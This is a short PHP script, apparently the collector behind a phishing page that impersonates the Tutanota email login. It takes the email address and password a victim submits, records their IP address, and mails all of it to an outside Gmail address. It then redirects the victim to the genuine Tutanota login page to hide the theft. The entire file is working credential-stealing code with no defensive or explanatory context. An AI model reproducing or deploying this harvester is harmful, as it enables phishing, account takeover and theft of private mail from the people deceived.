<?
$ip = getenv("REMOTE_ADDR");
$message .= "------------ : || tutanota || :-------------\n";
$message .= "tutanota              : ".$_POST['email']."\n";
$message .= "Password               : ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "--------------: || CREATED BY RITO   || :---------------\n";
$recipient ="johnmark2k7@gmail.com";
$subject = "tutanota |  $ip | $adddate\n\n";
mail($recipient,$subject,$message);
header("Location: https://app.tutanota.com/#login");
?>